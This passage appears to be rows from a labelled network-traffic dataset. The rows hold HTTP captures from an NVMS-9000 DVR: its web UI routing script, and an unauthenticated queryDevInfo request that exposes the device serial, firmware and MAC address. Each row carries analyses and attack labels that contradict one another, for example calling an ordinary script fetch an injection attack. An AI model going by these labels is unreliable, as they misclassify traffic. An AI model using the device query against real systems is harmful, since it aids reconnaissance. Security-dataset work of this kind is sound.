+            },
+            ""config/alarm/osc"": {
+                path: ""main/alarmCfgFrame/oscAlarmCfg"",
+                lk: ""IDCS_WATCH_DETECTION"",
+                navSequence: ['config/home', 'config/alarm/osc']
+            },
+            ""config/alarm/avd"": {
+                path: ""main/alarmCfgFrame/avdAlarmCfg"",
+                lk: ""IDCS_ABNORMAL_DISPOSE_WAY"",
+                navSequence: ['config/home', 'config/alarm/avd']
+            },
+            ""config/alarm/tripwire"": {
+                path: ""main/alarmCfgFrame/tripwireAlarmCfg"",
+                lk: ""IDCS_BEYOND_DETECTION"",
+                navSequence: ['config/home', 'config/alarm/tripwire']
+            },
+            ""config/alarm/pea"": {
+                path: ""main/alarmCfgFrame/peaAlarmCfg"",
+                lk: ""IDCS_INVADE_DETECTION"",
+                navSequence: ['config/home', 'config/alarm/pea']
+            },
+            ""config/alarm/sensor"": {
+                path: ""main/alarmCfgFrame/sensorAlarmCfg"",
+                lk: ""IDCS_DISPOSE_WAY_SET"",
+                navSequence: ['config/home', 'config/alarm/sensor']
+            },
+            ""config/alarm/abnormal"": {
+                path: ""main/alarmCfgFrame/abnormalAlarmCfg"",
+                lk: ""IDCS_SYSTEM_ABNORMAL_DISPOSE_WAY_SET"",
+                navSequence: ['config/home', 'config/alarm/abnormal']
+            },
+            ""config/alarm/device/offline"": {
+                path: ""main/alarmCfgFrame/devOfflineAlarmCfg"",
+                lk: ""IDCS_IPC_OFFLINE_SET"",
+                navSequence: ['config/home', 'config/alarm/device/offline']
+            },
+            ""config/alarm/video/loss"": {
+                path: ""main/alarmCfgFrame/videoLossAlarmCfg"",
+                lk: ""IDCS_VIDEO_LOSE_SET"",
+                navSequence: ['config/home', 'config/alarm/video/loss']
+            },
+            ""config/alarm/status"": {
+                path: ""main/alarmCfgFrame/viewAlarmStatus"",
+                lk: ""IDCS_VIEW_ALARM_STATE"",
+                navSequence: ['config/home', 'config/alarm/status']
+            },
+            //
+            ""config/disk/manager"": {
+                path: ""main/systemFrame/diskManagement"",
+                lk: ""IDCS_DISK_MANAGE"",
+                navSequence: ['config/home', 'config/disk/manager']
+            },
+            ""config/disk/storage/mode"": {
+                path: ""main/systemFrame/storageModeCfg"",
+                lk: ""IDCS_STORAGE_MODE_SET"",
+                navSequence: ['config/home', 'config/disk/storage/mode']
+            },
+            ""config/disk/information"": {
+                path: ""main/systemFrame/viewDiskInfo"",
+                lk: ""IDCS_VIEW_DISK_INFORMATION"",
+                navSequence: ['config/home', 'config/disk/information']
+            },
+            ""config/disk/information/smart"": {
+                path: ""main/systemFrame/viewSmartInfo"",
+                lk: ""IDCS_DISK_SMART_INFO"",
+                navSequence: ['config/home', 'config/disk/information/smart']
+            },
+            //
+            ""config/security/user/add"": {
+                path: ""main/userCfgFrame/addUser"",
+                lk: ""IDCS_ADD_USER"",
+                navSequence: ['config/home', 'config/security/user/list', 'config/security/user/add']
+            },
+            ""config/security/user/list"": {
+                path: ""main/userCfgFrame/userMgr"",
+                lk: ""IDCS_CHANGE_OR_DELETE_USER"",
+                navSequence: ['config/home', 'config/security/user/list']
+            },
+            ""config/security/auth_group/add"": {
+                path: ""main/userCfgFrame/addAuthGroup"",
+                lk: ""IDCS_ADD_USER_RIGHT"",
+                navSequence: ['config/home', 'config/security/auth_group/list', 'config/security/auth_group/add']
+            },
+            ""config/security/auth_group/list"": {
+                path: ""main/userCfgFrame/authGroupMgr"",
+                lk: ""IDCS_CHANGE_OR_DELETE_RIGHT_GROUP"",
+                navSequence: ['config/home', 'config/security/auth_group/list']
+            },
+            ""config/security/rule/filter"": {
+                path: ""main/userCfgFrame/filterRule"",
+                lk: ""IDCS_BLACK_AND_WHITE_LIST"",
+                navSequence: ['config/home', 'config/security/rule/filter']
+            },
+            ""config/security/preview/logout"": {
+                path: ""main/userCfgFrame/logoutViewAuthCfg"",
+                lk: ""IDCS_PREVIEW_AUTHORITY_AFTER_LOGOUT"",
+                navSequence: ['config/home', 'config/security/preview/logout']
+            },
+            ""config/security/passwordSecurity"": {
+                path: ""main/userCfgFrame/passwordSecurity"",
+                lk: ""IDCS_PASSWORD_SAFETY"",
+                navSequence: ['config/home', 'config/security/passwordSecurity']
+            },
+            ""config/security/user/status"": {
+                path: ""main/userCfgFrame/userStatus"",
+                lk: ""IDCS_ONLINE_USER"",
+                navSequence: ['config/home', 'config/security/user/status']
+            },
+            //
+            ""config/net/tcp_ip"": {
+                path: ""main/netCfgFrame/netBase"",
+                lk: ""IDCS_TCP_IPV4"",
+                navSequence: ['config/home', 'config/net/tcp_ip']
+            },
+            ""config/net/email"": {
+                path: ""main/netCfgFrame/email"",
+                lk: ""IDCS_EMAIL"",
+                navSequence: ['config/home', 'config/net/email']
+            },
+            ""config/net/pppoe"": {
+                path: ""main/netCfgFrame/pppoe"",
+                lk: ""PPPOE"",
+                navSequence: ['config/home', 'config/net/pppoe']
+            },
+            ""config/net/ddns"": {
+                path: ""main/netCfgFrame/ddns"",
+                lk: ""DDNS"",
+                navSequence: ['config/home', 'config/net/ddns']
+            },
+            ""config/net/port"": {
+                path: ""main/netCfgFrame/port"",
+                lk: ""IDCS_PORT"",
+                navSequence: ['config/home', 'config/net/port']
+            },
+            ""config/net/upnp"": {
+                path: ""main/netCfgFrame/upnp"",
+                lk: ""IDCS_UPNP"",
+                navSequence: ['config/home', 'config/net/upnp']
+            },
+            ""config/net/nat"": {
+                path: ""main/netCfgFrame/nat"",
+                lk: ""IDCS_NAT"",
+                navSequence: ['config/home', 'config/net/nat']
+            },
+            ""config/net/https"": {
+                path: ""main/netCfgFrame/https"",
+                lk: ""IDCS_HTTPS"",
+                navSequence: ['config/home', 'config/net/https']
+            },
+            ""config/net/platform"": {
+                path: ""main/netCfgFrame/platform"",
+                lk: ""IDCS_PLATFORM_ACCESS"",
+                navSequence: ['config/home', 'config/net/platform']
+            },
+            ""config/net/ftp"": {
+                path: ""main/netCfgFrame/ftp"",
+                lk: ""FTP"",
+                navSequence: ['config/home', 'config/net/ftp']
+            },
+            ""config/net/snmp"": {
+                path: ""main/netCfgFrame/snmp"",
+                lk: ""IDCS_SNMP"",
+                navSequence: ['config/home', 'config/net/snmp']
+            },
+            ""config/net/status"": {
+                path: ""main/netCfgFrame/netStatus"",
+                lk: ""IDCS_VIEW_NETWORK_STATE"",
+                navSequence: ['config/home', 'config/net/status']
+            },
+            ""config/net/video/online"": {
+                path: ""main/netCfgFrame/onlineVideo"",
+                lk: ""IDCS_ONLINE_VIDEO_LINK"",
+                navSequence: ['config/home', 'config/net/video/online']
+            },
+            //
+            ""config/system/common"": {
+                path: ""main/systemFrame/commonCfg"",
+                lk: ""IDCS_GENERAL_SET"",
+                navSequence: ['config/home', 'config/system/common']
+            },
+            ""config/system/time"": {
+                path: ""main/systemFrame/dateAndTime"",
+                lk: ""IDCS_DATE_AND_TIME"",
+                navSequence: ['config/home', 'config/system/time']
+            },
+            ""config/system/pos"": {
+                path: ""main/systemFrame/posCfg"",
+                lk: ""IDCS_POS_CONFIG"",
+                navSequence: ['config/home', 'config/system/pos']
+            },
+            ""config/system/log"": {
+                path: ""main/systemFrame/viewLog"",
+                lk: ""IDCS_VIEW_LOG"",
+                navSequence: ['config/home', 'config/system/log']
+            },
+            ""config/system/restore_factory_settings"": {
+                path: ""main/systemFrame/factoryReset"",
+                lk: ""IDCS_DEFAULT_SET"",
+                navSequence: ['config/home', 'config/system/restore_factory_settings']
+            },
+            ""config/system/upgrade"": {
+                path: ""main/systemFrame/upgrade"",
+                lk: ""IDCS_UPGRADE"",
+                navSequence: ['config/home', 'config/system/upgrade']
+            },
+            ""config/system/upgradeOnline"": {
+                path: ""main/systemFrame/upgradeOnline"",
+                lk: ""IDCS_ONLINE_UPGRADE"",
+                navSequence: ['config/home', 'config/system/upgradeOnline']
+            },
+            ""config/system/backup_and_restore"": {
+                path: ""main/systemFrame/backupRestore"",
+                lk: ""IDCS_BACKUP_AND_RESTORE_SET"",
+                navSequence: ['config/home', 'config/system/backup_and_restore']
+            },
+            ""config/system/reboot"": {
+                path: ""main/systemFrame/reboot"",
+                lk: ""IDCS_SYSTEM_REBOOT"",
+                navSequence: ['config/home', 'config/system/reboot']
+            },
+            ""config/system/maintenance/auto"": {
+                path: ""main/systemFrame/timeRestart"",
+                lk: ""IDCS_AUTO_MAINTENANCE"",
+                navSequence: ['config/home', 'config/system/maintenance/auto']
+            },
+            ""config/system/information"": {
+                path: ""main/systemFrame/devBasicInfo"",
+                lk: ""IDCS_DEVICE_BASIC_INFORMATION"",
+                navSequence: ['config/home', 'config/system/information']
+            },
+            ""config/system/channel/status"": {
+                path: ""main/systemFrame/chlStatus"",
+                lk: ""IDCS_CHANNEL_STATE"",
+                navSequence: ['config/home', 'config/system/channel/status']
+            },
+            ""config/system/platform/parameter"": {
+                path: ""main/systemFrame/platformParam"",
+                lk: ""IDCS_PLATFORM_PARAMETER"",
+                navSequence: ['config/home', 'config/system/platform/parameter']
+            },
+            ""config/system/upload/image/timing"": {
+                path: ""main/systemFrame/timedImageUpload"",
+                lk: ""IDCS_SCHEDULE_PIC_UPLOAD"",
+                navSequence: ['config/home', 'config/system/upload/image/timing']
+            },
+            ""config/system/upload/image/alarm"": {
+                path: ""main/systemFrame/alarmImageUpload"",
+                lk: ""IDCS_ALARM_PIC_UPLOAD"",
+                navSequence: ['config/home', 'config/system/upload/image/alarm']
+            },
+            ""config/system/platform/operation"": {
+                path: ""main/systemFrame/platformOperation"",
+                lk: ""IDCS_PLATFORM_OPERATE_MANAGE"",
+                navSequence: ['config/home', 'config/system/platform/operation']
+            }
+        };
+
+        function init(url) {
+            defaultUrl = url;
+            $(window).bind('hashchange', _doNav);
+        }
+
+        function autoHeight() {
+            $(""#Content"").height(document.body.clientHeight - 118);
+        }
+
+        $(window).resize(function () {
+            autoHeight();
+        });
+
+
+        //
+        function parsePath(url) {
+            if (!url) return null;
+            var path = routeMap[url].path;
+            path = path.split(""/"");
+            return $.grep(path, function (n, i) {
+                return n.length > 0;
+            }, false);
+        }
+
+
+        function _doNav() {
+            //
+            var newRouteUrl, uHash = location.hash;
+            if (uHash.length > 0) {
+                newRouteUrl = uHash.substr(1);
+            }
+            else
+                newRouteUrl = null;
+
+            //
+            if (!(newRouteUrl in routeMap)) {
+                if (routeUrl)
+                    doNav(routeUrl);
+                else
+                    doNav(defaultUrl);
+                return;
+            }
+            //
+            if (newRouteUrl == routeUrl)
+                return;
+
+            routeUrl = newRouteUrl;
+
+            var lastRoutePath = parsePath(lastRouteUrl);
+            var routePath = parsePath(routeUrl);
+
+            var navPathIndex = 0;
+            //Index
+            if (lastRoutePath != null && lastRoutePath.length > 0) {
+                for (var i = 0; i < routePath.length; i++) {
+                    if (lastRoutePath[i] == null || routePath[i] != lastRoutePath[i]) {
+                        navPathIndex = i;
+                        break;
+                    }
+                }
+            }
+
+            //
+            if (routePath == null || routePath.length == 0) {
+                doNav(defaultUrl);
+                return;
+            }//
+            else if (navPathIndex >= routePath.length) {
+                routeUrl = lastRouteUrl;
+                return;
+            }
+
+
+            //$(""body"").css({visibility: 'hidden', opacity: 0});
+            $(""body"").css({opacity: 0});
+            //IndexIndexbeforeUnload
+            if (lastRoutePath != null) {
+                var neesUnloadApModuleNames = [];
+                var parentContents = [];
+                for (var i = lastRoutePath.length - 1; i >= navPathIndex; i--) {
+                    var apId = lastRoutePath[i];
+                    if (apId in appModuleList) {
+                        neesUnloadApModuleNames.push(appModuleList[apId][""apModule""]);
+                        if (lastRoutePath[i - 1] && lastRoutePath[i - 1] in appModuleList && appModuleList[lastRoutePath[i - 1]][""subContainer""])
+                            parentContents.push($(appModuleList[lastRoutePath[i - 1]][""subContainer""]));
+                        else
+                            parentContents.push(null);
+                    }
+                }
+                //APAPAPAPAP
+                require(neesUnloadApModuleNames,
+                    function () {
+                        for (var i in arguments) {
+                            if (arguments[i]) {
+                                if ((""BeforeUnload"" in arguments[i]))
+                                    arguments[i][""BeforeUnload""]();
+
+                                //CSSViewbody0body
+                                if (parentContents[i])
+                                    parentContents[i].empty();
+
+                                if ((""UnloadCss"" in arguments[i])) {
+                                    arguments[i][""UnloadCss""]();
+                                }
+                            }
+                        }
+                        routeToNewUrl(navPathIndex, routePath);
+                    });
+            }
+            else {
+                routeToNewUrl(navPathIndex, routePath);
+            }
+        }
+
+        function routeToNewUrl(navPathIndex, routePath) {
+            route(navPathIndex, routePath);
+            setCfgNavBar(routeUrl);
+            lastRouteUrl = routeUrl;
+            //
+            routeUrlChangedEvent.emit(routeUrl);
+        }
+
+        function setCfgNavBar(routeUrl, $navBar) {
+            var routeUrlItem = routeMap[routeUrl];
+            if (""navSequence"" in routeUrlItem) {
+                var navSequence = routeUrlItem[""navSequence""];
+                var navBarHtml = """";
+                for (var i = 0; i < navSequence.length; i++) {
+                    if (i > 0)
+                        navBarHtml += ""<div alt=\""nav\""></div>"";
+                    navBarHtml += ""<a href=\""javascript:Route.DoNav('"" + navSequence[i] + ""')\"" >"" + LangCtrl._L_(routeMap[navSequence[i]][""lk""]) + ""</a>"";
+                }
+
+                $(""#navBar"").html(navBarHtml);
+            }
+        }
+
+        function bindRouteEvent($container, evt) {
+            evt = evt || ""click"";
+            $(""[routeUrl]"", $container).unbind(evt).bind(evt, function (e) {
+                if (e.stopPropagation)
+                    e.stopPropagation();
+                doNav($(this).attr(""routeUrl""));
+            });
+        }
+
+        //
+        function doNav(routeUrl) {
+            var oldRouteUrl = getCurrentRouteUrl();
+            if (oldRouteUrl == routeUrl) {
+                _doNav();
+            }
+            else {
+                location.hash = ""#"" + routeUrl;
+            }
+        }
+
+        function navToInitUrl() {
+            var url = $.webSession(""path"");
+            if (!url) url = getCurrentRouteUrl();
+            if (url === ""login"") url = defaultUrl;
+            doNav(url);
+        }
+
+        function getCurrentRouteUrl() {
+            return location.hash.substr(1);
+        }
+
+
+        ///**
+        // * 
+        // * @param {Number} routePathIndex : 
+        // */
+        function route(routePathIndex, routePath) {
+            try {
+                var pageContainer = $(""#BaseContent"");
+                if (routePathIndex > 0) {
+                    var preIndexApId = routePath[routePathIndex - 1];
+                    if (preIndexApId in appModuleList)
+                        pageContainer = $(appModuleList[preIndexApId][""subContainer""]);
+                    else
+                        throw ""Invalid AP ID"";
+                }
+                var apId = routePath[routePathIndex];
+                if (apId in appModuleList) {
+                    loadApModule(apId, pageContainer, function (apModule) {
+                        autoHeight();
+                        if (apModule && (""OnLoad"" in apModule)) {
+                            apModule[""OnLoad""]();
+                        }
+                        routePathIndex++;
+                        if (routePathIndex < routePath.length)
+                            route(routePathIndex, routePath);
+                        else {
+                            //$(""body"").css({visibility: 'visible'});
+                            $(""body"").animate({opacity: 1}, 600, ""swing"");
+                        }
+                    });
+                }
+                else
+                    throw ""Invalid AP ID"";
+            }
+            catch (ex) {
+                doNav(defaultUrl);
+            }
+        }
+
+        ///**
+        // * AP
+        // * @param {String} url : APID
+        // * @param {JQ Object} pageContainer : JQuery
+        // * @param {Function} loadCallBack : AP
+        // */
+        function loadApModule(apId, pageContainer, loadCallBack) {
+            var apModuleObj = appModuleList[apId];
+            require([apModuleObj.apModule],
+                function (apModule) {
+                    if (!apModule) {
+                        //URLview
+                        //pageContainer.empty();
+                        //$(""body"").css({visibility: 'visible'});
+                        $(""body"").animate({opacity: 1}, 600, ""swing"");
+                        return;
+                    }
+                    if (""LoadCss"" in apModule) {
+                        apModule[""LoadCss""](function () {
+                            loadView(apModuleObj, pageContainer, apModule, loadCallBack);
+                        });
+                    }
+                    else
+                        loadView(apModuleObj, pageContainer, apModule, loadCallBack);
+                });
+        }
+
+
+        ///**
+        // * 
+        // * @param {String} url : 
+        // * @param {JQ Object} pageContainer : JQuery
+        // * @param {Function} loadCallBack : 
+        // */
+        function loadView(apModuleObj, pageContainer, apModule, loadCallBack) {
+            var url;
+            //url
+            if (""url"" in apModuleObj) {
+                url = apModuleObj.url;
+            }
+            //APgetViewUrlurl
+            else if (""GetViewUrl"" in apModule) {
+                url = apModule.GetViewUrl();
+            }
+            else
+                throw ""Invalid Module"";
+
+            Loading.Show();
+            //URLview
+            //pageContainer.empty();
+            commonOnUnload();
+
+            $.ajax({
+                type: ""GET"",
+                cache: false,
+                dataType: ""html"",
+                url: url
+            }).done(function (data, textStatus, jqXHR) {
+                pageContainer.html(data);
+                LangCtrl.Translate(pageContainer);
+                bindRouteEvent(pageContainer);
+                Loading.Hide();
+                if (typeof loadCallBack == ""function"") {
+                    loadCallBack(apModule);
+                }
+            }).fail(function (jqXHR, textStatus, errorThrown) {
+                Loading.Hide();
+                $(document.body).html("""");
+            });
+        }
+
+        function cleareDislog(context) {
+            if (!context) {
+                context = document;
+            }
+            $(""div.tvt_dialog_background.closeOnViewSwitch"", context).remove();
+            $(""div.tvt_dialog.closeOnViewSwitch"", context).remove();
+        }
+
+        function commonOnUnload() {
+            cleareDislog(document);
+            $(""#toolBar"").empty();
+            $(""#Content,#divCopyRight"").css(""min-width"", ""1100px"");
+        }
+
+        function logout(errorCode) {
+            var sessionId = ""{""+ $.webSession('sessionId') +""}"";
+            var sendXml = Communication.GetRequestHeader(""doLogout"") +
+                ""<content><sessionId><![CDATA["" + sessionId + ""]]></sessionId></content>"" +
+                Communication.GetRequestEnd();
+
+            Communication.Request({
+                url: ""doLogout"",
+                data: sendXml,
+                checkCommonErrorSwitch: false
+            });
+
+            $.webSession('auInfo_N9K', null);
+            $.webSession('authGroupId', null);
+            $.webSession('analogChlCount', null);
+            $.webSession('ipChlMaxCount', null);
+            $.webSession('authMask', null);
+            $.webSession('authEffective', null);
+            $.webSession(""userId"", null);
+            $.webSession(""ec"", null);
+            $.webSession('sessionId', null);
+            setTimeout(function () {
+                Plugin.DisposePlugin();
+            },2000);
+            //
+            $.webSession('defaultPwd', null);
+            $.webSession('isChangedPwd', null);
+            $.webSession('pwdSaftyStrength', null);
+            $.webSession('pwdExpired', null);
+            $.webSession('LiveCache_SegNum', null);
+            isFirstLoadStream = true;
+            if (APP_TYPE == ""STANDARD"")
+                doNav(""login"");
+            else {
+                if (errorCode != undefined)
+                    $.cookie(""ec"", errorCode);
+                window.location.href = ""/index.html"";
+            }
+        }
+
+        window.Route = {
+            /**
+             * 
+             * @param {String} defaultPath : 
+             */
+            Init: init,
+            /**
+             * 
+             * @param {String} routePath : 
+             */
+            DoNav: doNav,
+            /**
+             * Url
+             * Url1.defaultPath2.defaultPath
+             */
+            NavToInitUrl: navToInitUrl,
+            /**
+             * :
+             * url hashAP channel/addchannel/list
+             *  apId / cfgFrame/addChl
+             * 
+             */
+            RouteMap: routeMap,
+            /**
+             * 
+             */
+            Logout: logout,
+            /**
+             * 
+             * @return {String} : 
+             */
+            GetCurrentRouteUrl: getCurrentRouteUrl,
+            /**
+             * 
+             */
+            RouteUrlChangedEvent: routeUrlChangedEvent,
+
+            SetCfgNavBar: setCfgNavBar
+        };
+
+        return window.Route;
+    });",tvt_queryDevInfo2.pcap,根据提供的统计特征，请求和响应次数均为1次，排除了DoS/DDoS类攻击的可能性。上行数据包大小为396.0±0.0 bytes，下行数据包大小为52478.0±0.0 bytes，显示出显著的不对称性，上行数据包大小稳定，而下行数据包异常大。这种模式不符合典型的正常流量行为，正常流量通常表现为上行和下行数据包大小相对均衡。异常大的下行数据包可能指示数据泄露或某种形式的注入攻击。时间间隔方面，上行和下行时间间隔均非常短，但考虑到请求和响应次数仅为1次，这一点不足以单独指示攻击。综合来看，这种流量模式可能异常，特别是下行数据包的异常大小，可能指示某种形式的数据泄露或注入攻击。,anomalous packet size injection,True,"The request appears to be a normal HTTP GET request for a JavaScript file (/js/lib/Route.js) from an IP address (5.2.202.19). The User-Agent indicates it's from an iPhone, which is common for web browsing. No suspicious parameters or headers were found.","The response is a 200 OK with a JavaScript file content. The content defines a route management module for a web application, which is typical for modern web applications. No sensitive data or error messages were exposed in the response.","[""无""]",[],Potential Unknown Attack,"Anomalous packet size injection detected in network traffic, suggesting potential manipulation or exploitation attempt.","The product handles network packets in a way that allows for anomalous packet size injection, potentially leading to denial of service or other security breaches due to insufficient validation of packet sizes.",0.7,"The traffic exhibits an anomalous packet size injection, which does not match any known attack patterns directly but suggests a potential manipulation or exploitation attempt. This could indicate a novel attack method or a misconfiguration. The lack of specific request or response features and the absence of identifiable files or device types make it challenging to pinpoint the exact nature of the attack, hence classified as a potential unknown attack with moderate confidence."
+209.141.46.203,5.2.202.19,52646,80,518.0,643.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2275540828704834,1,1,"[""{'200': 1}""]","POST /queryDevInfo HTTP/1.1
+Host: 5.2.202.19
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1
+Content-Length: 103
+
+<?xml version=""1.0"" encoding=""utf-8"" ?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""/>","HTTP/1.1 200 OK
+Content-type: text/xml
+Content-Length: 560
+Connection: close
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<response cmdId="""" cmdUrl=""queryDevInfo"">
+	<name>Device Name</name>
+	<productModel>QTH167</productModel>
+	<sn>NCFEE04C29DQ</sn>
+	<hardwareVersion>30022-V0</hardwareVersion>
+	<mcuVersion>---</mcuVersion>
+	<kenerlVersion>I9C2-I9B9-J6R3</kenerlVersion>
+	<softwareVersion>1.3.4.27593B190627.D44.U3(16A82T)</softwareVersion>
+	<launchDate>20190627.1140</launchDate>
+	<apiVersion>1.6.0 build20170725</apiVersion>
+	<onvifVersion>17.06</onvifVersion>
+	<ocxVersion>3.1.0.34</ocxVersion>
+	<eth0>00:18:AE:AF:CF:EE</eth0>
+</response>
+",tvt_queryDevInfo2.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, with stable packet sizes (no variance in both uplink and downlink sizes) and no time interval between packets. These characteristics are typical of normal traffic, as they indicate a single, complete transaction without any anomalies in size or timing that would suggest malicious activity. The absence of multiple requests or responses rules out DoS/DDoS attacks, and the uniformity in packet sizes and intervals does not indicate any form of injection or scanning behavior.",无,False,"The request is directed to '/queryDevInfo' with a POST method, which is a common path for IoT device information queries. The request includes an XML payload specifying systemType as 'NVMS-9000', indicating a specific IoT device model. This behavior is typical for device information queries but could be exploited if the device is vulnerable.","The response contains detailed device information including product model 'QTH167', hardware and software versions, and other sensitive data. This level of detail in response to a simple query is indicative of potential information disclosure vulnerabilities, especially if this information can be accessed without proper authentication.","[""IoT Device Information Disclosure"", ""NVMS-9000 Device Query""]","[""queryDevInfo"", ""NVMS-9000"", ""QTH167""]",IoT Device Exploitation,An information disclosure vulnerability in NVMS-9000 devices allows remote attackers to obtain sensitive device information via a crafted request to the queryDevInfo endpoint.,The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.,0.9,"The traffic exhibits characteristics of an IoT device information disclosure, specifically targeting NVMS-9000 devices through the queryDevInfo endpoint. This behavior matches known vulnerabilities where attackers exploit insufficient access controls or input validation to retrieve sensitive device information. The presence of specific device model and query parameters in the traffic strongly suggests an exploitation attempt, hence the high confidence in this assessment."
